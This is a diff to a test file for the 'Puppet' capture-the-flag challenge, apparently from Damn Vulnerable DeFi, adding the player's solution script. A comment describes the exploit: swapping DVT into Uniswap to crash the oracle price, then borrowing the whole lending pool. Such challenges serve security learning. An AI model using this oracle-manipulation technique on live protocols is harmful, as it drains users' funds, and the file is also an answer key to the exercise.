@@ -94,7 +94,16 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The logic is within the PuppetAttacker contract. It first swaps all DVT tokens in uniswap to bring down
+        // the price, then borrow all DVT from the lending pool.
+        attack = await (await ethers.getContractFactory('PuppetAttacker', deployer)).deploy(
+            token.address,
+            lendingPool.address,
+            uniswapExchange.address,
+            {value: ethers.utils.parseEther("20")}
+        );
+        await token.connect(player).transfer(attack.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attack.attack(player.address);
     });
 
     after(async function () {
